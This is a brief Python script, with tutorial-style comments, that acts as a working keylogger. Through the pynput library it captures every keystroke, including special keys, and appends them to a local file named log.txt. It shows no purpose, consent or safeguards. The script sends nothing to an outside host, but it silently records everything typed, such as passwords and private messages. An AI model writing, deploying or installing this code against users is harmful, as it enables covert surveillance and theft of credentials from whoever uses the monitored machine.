from pynput.keyboard import Listener

# This function runs every time a key is pressed
def on_press(key):
    try:
        with open("log.txt", "a") as file:
            file.write(f"{key.char}")
    except AttributeError:
        # Special keys (like space, enter, etc.)
        with open("log.txt", "a") as file:
            file.write(f" [{key}] ")

# Start listening to keyboard
with Listener(on_press=on_press) as listener:
    listener.join()
